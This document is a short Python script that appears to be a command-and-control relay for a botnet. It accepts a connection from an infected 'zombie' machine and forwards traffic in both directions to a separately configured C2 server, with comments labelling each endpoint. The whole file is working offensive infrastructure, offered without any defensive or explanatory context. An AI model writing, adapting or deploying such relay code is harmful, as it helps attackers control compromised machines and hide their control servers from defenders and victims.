import socket, threading

host = '127.0.0.1' #c2 ip
port = 4443 #c2 port
zhost = '127.0.0.1' #the ip u wanna listen on
zport = 8888 #port

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((zhost,zport))
server.listen()
client, address = server.accept()

router = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
router.connect((host,port))

def get_data_from_zombie():
    while True:
        zdata = client.recv(1024)
        if not zdata:
            break
        router.sendto(zdata, (host, port))
        continue
def get_data_from_host():
    while True:
        data = router.recv(1024)
        if not data:
            break
        client.send(data)
        continue

t = threading.Thread(target=get_data_from_zombie)
t.start()
k = threading.Thread(target=get_data_from_host)
k.start()
